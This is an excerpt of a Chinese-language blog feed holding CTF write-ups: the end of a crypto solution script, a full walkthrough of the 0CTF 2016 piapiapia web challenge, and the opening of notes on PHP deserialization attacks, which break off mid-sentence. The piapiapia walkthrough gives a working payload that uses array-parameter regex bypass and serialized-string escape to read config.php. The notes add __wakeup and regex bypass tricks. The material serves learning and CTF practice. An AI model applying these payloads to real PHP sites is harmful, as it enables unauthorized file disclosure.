2^{1200}$所以其实咱们可以直接有<br>$$<br>2^{2001} + 2^{1200}pd +2^{1201}f+ 2^{400} pd \cdot f \equiv 2^{400}pd \cdot f \equiv r_{34} \mod 2^{1200} \\<br>2^{400}pd \cdot f = r_{34} % \ 2^{1200}<br>$$<br>这样我们就能求出$pd \cdot f = a$了, 然后我们直接$(1)$式两边同时乘$f$, 把$pd \cdot f$带入, 就可以构造出一个关于$f$的一元二次方程了.<br>$$<br>2^{2001} \cdot f + 2^{1200} a +2^{1201}f^2+ 2^{400} a \cdot f = r_{34} \cdot f<br>$$<br>解出$f$发现…是假flag, md我算了那么久居然是个假的??? 突然想到会不会padding2才是真正的flag, 又把padding2算出来了, 果然….padding2才是真flag</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="built_in">int</span>(c3.nth_root(<span class="number">3</span>) % (<span class="number">2</span>^<span class="number">2001</span>))</span><br><span class="line">pdf =  <span class="built_in">int</span>(c %<span class="number">2</span>^<span class="number">1200</span> // <span class="number">2</span>^<span class="number">400</span>)</span><br><span class="line">x = var(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">f = <span class="number">2</span>^<span class="number">1200</span> * pdf - c * x + <span class="number">2</span>^<span class="number">1201</span> * x^<span class="number">2</span> + <span class="number">2</span>^<span class="number">400</span> * x * pdf</span><br><span class="line">flag2  = <span class="built_in">int</span>(f.roots()[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">padding = pdf // flag2</span><br><span class="line">l2b(padding)</span><br><span class="line"><span class="comment"># b&#x27;1_l0v3_9ou&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>所以最后的flag就是<code>Nep&#123;Nep_n3p_ba4_bad_1_l0v3_9ou&#125;</code></p><h1 id="0x03-easyEncryption"><a href="#0x03-easyEncryption" class="headerlink" title="0x03 easyEncryption"></a>0x03 easyEncryption</h1><blockquote><p>暂时还没时间, 有空看看</p></blockquote><h1 id="0x04-lowExponent"><a href="#0x04-lowExponent" class="headerlink" title="0x04 lowExponent"></a>0x04 lowExponent</h1><blockquote><p>暂时还没时间, 有空看看</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;太菜了太菜了太菜了, 虽然说跑出去玩了两天, 但还是花了半天时间做的, 一道Coppersmith’s short-pad attack没有想到调$\beta$, 做了半天都没出来, 属实拉了. 最后也就做了个改表的base64….算是除了签到就没出吧(还有道古典不想查了5</summary>
      
    
    
    
    <category term="Write" scheme="http://tearsjin.github.io/categories/Write/"/>
    
    
    <category term="Crypto" scheme="http://tearsjin.github.io/tags/Crypto/"/>
    
    <category term="WriteUp" scheme="http://tearsjin.github.io/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>Noting of [0CTF 2016]piapiapia</title>
    <link href="http://tearsjin.github.io/2021/03/23/Noting-of-0CTF-2016-piapiapia/"/>
    <id>http://tearsjin.github.io/2021/03/23/Noting-of-0CTF-2016-piapiapia/</id>
    <published>2021-03-23T12:26:47.000Z</published>
    <updated>2021-03-23T12:35:26.296Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>这题算是第一次做比较长的web题, 收获很多, 好好记录一下</p></blockquote><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>这道题主要的考察点有:</p><ol><li>源码泄露</li><li>数组绕过正则匹配和<code>strlen()</code></li><li>反序列化字符逃逸</li></ol><h1 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h1><p>就一个登录页面, 随便输入尝试弱密码登录无果.<br>测试是否存在sql, 也没什么收获<br>随手一试<code>www.zip</code>, 可以下载 存在源码泄露</p><p>源码主要有这几个文件:</p><ul><li>update.php</li><li>register.php</li><li>profile.php</li><li>index.php</li><li>config.php</li><li>class.php</li></ul><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h2><p>做ctf肯定要找flag, <code>config.php</code>中就有<code>$flag</code>, 所以要想办法读取<code>config.php</code>.<br>大概浏览了一下, 在<code>profile.php</code>中发现了这么一行<br> <code>$photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));</code></p><p>再往上找找看这个函数中的参数是否可控, 下面是往上找的过程:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// profile.php</span></span><br><span class="line"><span class="variable">$profile</span> = unserialize(<span class="variable">$profile</span>); </span><br><span class="line"><span class="comment">// 可能存在反序列化漏洞, 也可以知道这里的$profile是个序列化串, 继续往前</span></span><br><span class="line"><span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$photo</span> = base64_encode(file_get_contents(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line"></span><br><span class="line"><span class="variable">$profile</span>=<span class="variable">$user</span>-&gt;show_profile(<span class="variable">$username</span>); <span class="comment">// $profile 是调用$user-&gt;show_profile()得到的</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// class.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123; </span><br><span class="line">    <span class="comment">// profile是从数据库读出来的, 并且没有处理, 所以数据库中就是序列化字符串</span></span><br><span class="line"><span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$object</span> = <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$object</span>-&gt;profile;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$new_profile</span></span>) </span>&#123; </span><br><span class="line">    <span class="comment">// profile上传时会经过一次过滤</span></span><br><span class="line"><span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$new_profile</span> = <span class="built_in">parent</span>::filter(<span class="variable">$new_profile</span>); <span class="comment">// 这个过滤器会替换字符, 可以使得字符长度变长</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, <span class="variable">$new_profile</span>, <span class="variable">$where</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到这里大概就有思路了, <code>$profile</code>是上传至数据库后重新读取下来的, 而且上传之前会对序列化串进行一次替换, 替换存在字符数量增加, 也就意味着可以字符逃逸,  如果有字符逃逸, 那么完全可以伪造一个假的<code>$profile[&#39;photo&#39;]=&#39;config.php&#39;</code>, 然后读取flag</p><p>再继续往前看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// register.php 提供了注册的入口, 注册完就能随便登录了, 登录后就能上传profile</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// update.php</span></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span>-&gt;update_profile(<span class="variable">$username</span>, serialize(<span class="variable">$profile</span>));</span><br></pre></td></tr></table></figure><p>可以看到我们可以控制的有很多参数<code>phone, email, nickname</code>都可以, 但是如果要进行字符逃逸, 必然会被前面的正则发现导致上传失败, 所以要想办法绕过</p><h2 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h2><p>php中的数组是一个很神奇的东西, 他会有下面这些特性</p><ol><li><code>md5(Array()) = null</code></li><li><code>sha1(Array()) = null</code></li><li><code>ereg(pattern,Array()) =null</code></li><li><code>preg_match(pattern,Array()) = false</code></li><li><code>strcmp(Array(), “abc”) =null</code></li><li><code>strpos(Array(),“abc”) = null </code></li><li><code>strlen(Array()) = null</code> 5.3以下版本无报错, 5.3及以上版本会出现E_NOTICE级别错误, 下面有关于错误等级的一些知识</li></ol><p> 我们可以看到, 如果参数是数组, 那么<code>preg_match()</code>和<code>strlen()</code>都会返回NULL,并且出现E_NOTICE错误, 这个错误是不影响程序继续运行的. </p><p>所以, 我们只要传参<code>nickname[]=xxxxxx</code>, 就可以绕过这个正则, 任意控制参数<code>$_POST[&#39;nickname&#39;]</code>了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="PHP-错误等级"><a href="#PHP-错误等级" class="headerlink" title="PHP 错误等级"></a>PHP 错误等级</h3><p>E_NOTICE 表示一般情形不记录，只有程式有错误情形时才用到，例如企图存取一个不存在的变数，或是呼叫 stat() 函式检视不存在的档案。<br>E_WARNING 通常都会显示出来，但不会中断程式的执行。这对除错很有效。例如：用有问题的常规表示法呼叫 ereg()。<br>E_ERROR 通常会显示出来，亦会中断程式执行。意即用这个遮罩无法追查到记忆体配置或其它的错误。<br>E_PARSE 从语法中剖析错误。<br>E_CORE_ERROR 类似 E_ERROR，但不包括 PHP核心造成的错误。<br>E_CORE_WARNING 类似 E_WARNING，但不包括 PHP 核心错误警告。</p><p>所以整个流程就是</p><p>通过绕过正则任意上传<code>nickename</code> -&gt; 替换<code>serialize_string</code>中的字符改变字符长度造成字符逃逸 -&gt; 利用<code>file_get_contents()</code>读取<code>config.php</code></p><h1 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h1><p>那么要怎么构造<code>nickname[]</code>来进行字符逃逸呢,</p><p>先来看看这个序列化字符串大概是怎样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="string">&#x27;11111111111&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&#x27;11111111@qq.com&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$profile</span>);</span><br><span class="line"><span class="comment"># ?nickname[]=</span></span><br><span class="line"><span class="comment"># a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:15:&quot;11111111@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:0:&quot;&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>如果我们想最后反序列化出来的<code>photo =&gt; config.php</code>,<br>那么传上去的<code>nickname</code>最后一段应该是这个<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>,  这段字符一共34个, 再看一下替换的函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line"><span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>; <span class="comment"># 过滤&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27; 替换成hacker</span></span><br><span class="line"><span class="keyword">return</span> preg_replace(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br></pre></td></tr></table></figure><p>可以看到, 序列化后的字符串<code>serialize_string</code>中存在<code>where</code>时会被替换成<code>hacker</code>, 那么字符串长度就会+1<br>所以<code>nickname</code>中需要34个<code>where</code>就能把后面的字符挤出去实现逃逸, 可以看一下具体效果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ?nickname[]=</span></span><br><span class="line"><span class="comment">#wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="string">&#x27;11111111111&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&#x27;11111111@qq.com&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$profile</span>);</span><br><span class="line"><span class="comment"># a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:15:&quot;11111111@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> filter(serialize(<span class="variable">$profile</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment"># a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:15:&quot;11111111@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>等到反序列化的时候, 就只会反序列化前面一部分了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:15:&quot;11111111@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>结果就会是:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">4</span>) &#123; [<span class="string">&quot;phone&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">11</span>) <span class="string">&quot;11111111111&quot;</span> </span><br><span class="line">[<span class="string">&quot;email&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">15</span>) <span class="string">&quot;11111111@qq.com&quot;</span> </span><br><span class="line">[<span class="string">&quot;nickname&quot;</span>]=&gt; <span class="keyword">array</span>(<span class="number">1</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">204</span>) <span class="string">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span> &#125; </span><br><span class="line">[<span class="string">&quot;photo&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">10</span>) <span class="string">&quot;config.php&quot;</span> </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>成功了!</p><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><p>先随便注册一个用户并登录，在<code>profile</code>上传的时候先随便填写数据，再抓包，将<code>nickname</code>改成<br><code>nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></p><p>上传完后访问<code>profile.php</code>, 查看图片的地址，最后把<code>base64</code>转成文本就有flag了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;这题算是第一次做比较长的web题, 收获很多, 好好记录一下&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;这道题主要</summary>
      
    
    
    
    <category term="WebSummary" scheme="http://tearsjin.github.io/categories/WebSummary/"/>
    
    
    <category term="Web" scheme="http://tearsjin.github.io/tags/Web/"/>
    
    <category term="源码泄露" scheme="http://tearsjin.github.io/tags/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
    
    <category term="unsrialize" scheme="http://tearsjin.github.io/tags/unsrialize/"/>
    
    <category term="字符逃逸" scheme="http://tearsjin.github.io/tags/%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/"/>
    
    <category term="正则绕过" scheme="http://tearsjin.github.io/tags/%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>The learning of php unserialize</title>
    <link href="http://tearsjin.github.io/2021/03/23/The-learning-of-php-unserialize/"/>
    <id>http://tearsjin.github.io/2021/03/23/The-learning-of-php-unserialize/</id>
    <published>2021-03-23T06:20:24.000Z</published>
    <updated>2021-03-27T12:10:58.510Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>当<code>unserialize()</code>的参数可控时, 可以传入一个构造好的序列串控制类内部的变量甚至函数, 如果类内部存在比较危险的函数<code>include() eval()</code>等等, 将会造成严重后果</p><h1 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h1><p>当服务端代码中存在某个类的时候, 可以通过<code>unserialize()</code>创建一个该类的对象, 而我们可控的就是类中的属性, 还可以利用一些技巧去绕过一些魔术方法或者是利用一些魔术方法. 通过控制魔术方法和属性达到我们想要的攻击效果.</p><h2 id="一般流程"><a href="#一般流程" class="headerlink" title="一般流程"></a>一般流程</h2><ol><li><p> 寻找参数可控的<code>unserialize()</code></p></li><li><p>寻找可以用于命令执行, 文件包含等等的函数在危险类</p></li><li><p>找到一个控制链控制危险类中的危险函数</p></li></ol><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() &#x2F;&#x2F;执行unserialize()时，先会调用这个函数</span><br><span class="line">__sleep() &#x2F;&#x2F;执行serialize()时，先会调用这个函数</span><br><span class="line">__destruct() &#x2F;&#x2F;对象被销毁时触发</span><br><span class="line">__call() &#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() &#x2F;&#x2F;在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() &#x2F;&#x2F;用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</span><br><span class="line">__set() &#x2F;&#x2F;用于将数据写入不可访问的属性</span><br><span class="line">__isset() &#x2F;&#x2F;在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() &#x2F;&#x2F;在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() &#x2F;&#x2F;把类当作字符串使用时触发</span><br><span class="line">__invoke() &#x2F;&#x2F;当尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure><p>需要注意的是, <code>__toString()</code>这个方法触发的方式比较多:</p><ol><li><code>echo ($obj) / print($obj) </code>打印时会触发</li><li>反序列化对象与字符串连接时</li><li>反序列化对象参与格式化字符串时</li><li>反序列化对象与字符串进行<code>==</code>比较时（<code>PHP</code>进行<code>==</code>比较的时候会转换参数类型）</li><li>反序列化对象参与格式化<code>SQL</code>语句，绑定参数时</li><li>反序列化对象在经过<code>php</code>字符串函数，如 <code>strlen()</code>、<code>addslashes()</code>时</li><li>在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有<code>toString</code>返回的字符串的时候<code>toString</code>会被调用</li><li>反序列化的对象作为 class_exists() 的参数的时候</li></ol><h1 id="关于绕过的Trick"><a href="#关于绕过的Trick" class="headerlink" title="关于绕过的Trick"></a>关于绕过的Trick</h1><h2 id="绕过-wake"><a href="#绕过-wake" class="headerlink" title="绕过__wake()"></a>绕过__wake()</h2><blockquote><p>版本:<br>php 5&lt; 5.6.25<br>php 7&gt; 7.0.10</p></blockquote><p>利用方法:<strong>当序列化的字符串中的属性个数大于类中实际的属性个数时, 就会跳过__wake()函数</strong></p><h2 id="绕过正则表达式"><a href="#绕过正则表达式" class="headerlink" title="绕过正则表达式"></a>绕过正则表达式</h2><ol><li><p>加号绕过, 在反序列化的时候, 数字前面的加号会被当成是正号而正则匹配的时候则不会这样识别</p><p>比如说<code>O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;</code>, 有时候题目会通过正则<code>O\:\d</code>来匹配<code>O:4</code>, 这时将序列改<br>成<code>O:+4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;</code>就能绕过该匹配</p></li></ol><h2 id="变量引用"><a href="#变量引用" class="headerlink" title="变量引用"></a>变量引用</h2><p>利用变量引用使得类中两个变量始终相等</p><h1 id="php原生类反序列化"><a href="#php原生类反序列化" class="headerlink" title="php原生类反序列化"></a>php原生类反序列化</h1><h2 id="SoapClient反序列化利用"><a href="#SoapClient反序列化利用" class="headerlink" title="SoapClient反序列化利用"></a>SoapClient反序列化利用</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p>php安装<code>php-soap</code>扩展之后, 可以反序列化原生类<code>SoapClient</code>, 来发送<code>http post</code>请求来实现<code>SSRF</code><br>通过反序列化<code>SoapClient</code>对象后调用不存在的方法触发<code>__call()</code>方法<br>这个<code>__call()</code>方法会向指定<code>URL</code>发送<code>HTTP POST</code>请求, 因为<code>User-Agent</code>字段可控, 所以可以通过<code>CRLF</code>来构造请求头实现自定义<code>POST 